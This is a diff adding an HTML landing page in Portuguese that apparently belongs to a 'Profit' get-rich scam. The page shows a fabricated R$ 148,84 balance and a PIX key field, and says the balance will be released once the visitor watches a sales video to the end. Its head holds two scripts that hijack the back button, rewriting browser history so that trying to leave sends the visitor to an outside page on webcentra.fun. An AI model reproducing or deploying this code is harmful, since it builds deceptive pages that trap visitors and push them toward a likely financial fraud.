@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    
+    <script type="text/javascript">
+    var newUrl = location.pathname + location.search;
+    
+    (function(window, location) {
+    history.replaceState(null, document.title, newUrl+"#!/backbutton");
+    history.pushState(null, document.title, newUrl);
+    window.addEventListener("popstate", function() {
+    if(location.hash === "#!/backbutton") {
+    history.replaceState(null, document.title, newUrl);
+    setTimeout(function(){
+    location.replace("https://webcentra.fun/codigos4/indexback.html");
+    },0);
+    }
+    }, false);
+    }(window, location));
+    </script>
+    
+      <script>
+    // Verifica se o usuário tentou voltar para esta página
+    window.addEventListener('popstate', function(event) {
+        // Redireciona o usuário para a URL desejada
+        window.location.href = 'https://webcentra.fun/codigos4/indexback.html';
+    });
+</script>
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Profit</title>
+    <link rel="stylesheet" href="profitvsl.css">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@100;200;400;600&amp;display=swap" rel="stylesheet">
+</head>
+<body style="background-image: url('images/background.gif');">
+    <header>
+        <div class="saldo_div">
+            <p id="nome"></p>
+            <div>
+                <span>R$ 148,84</span>
+            </div>
+        </div>
+    </header>
+    <main id="main">
+          
+        <div class="div_pix">
+            
+            <span style="color: rgb(254, 255, 240); font-weight: bold;">CHAVE PIX: </span>
+            <span style="color: rgb(254, 255, 240); font-weight: bold;" id="chavePix"></span>
+            <span style="color: aliceblue; font-weight: bold;" id="pix"></span>
+        </div>
+
+        <!--Local do video-->
+        <div id="vid_6551a5f9477d480009f19a23" style="position:relative;width:100%;padding: 56.25% 0 0;"><img id="thumb_6551a5f9477d480009f19a23" src="https://images.converteai.net/3cd5b906-c0f0-4caf-9ace-9c8208a50c65/players/6551a5f9477d480009f19a23/thumbnail.jpg" style="position:absolute;top:0;left:0;width:100%;height:100%;object-fit:cover;display:block;"><div id="backdrop_6551a5f9477d480009f19a23" style="position:absolute;top:0;width:100%;height:100%;-webkit-backdrop-filter:blur(5px);backdrop-filter:blur(5px);"></div></div><script type="text/javascript" id="scr_6551a5f9477d480009f19a23">var s=document.createElement("script");s.src="https://scripts.converteai.net/3cd5b906-c0f0-4caf-9ace-9c8208a50c65/players/6551a5f9477d480009f19a23/player.js",s.async=!0,document.head.appendChild(s);</script>
+        <!--Local do video-->
+    </main>
+    <div>
+        <center>
+        <span style="color: rgb(254, 255, 240); font-weight: bold;">Fique até o final do vídeo que iremos criar seu Certificado H1A e liberar seu saldo. </span>  
+    </center>
+    </div>
+    
+    <footer>
+        <span>Ganhe dinheiro </span> <span>com a PROFIT</span> 
+    </footer>
+    <script src="profitvsl.js"></script>
+</body>
+</html>
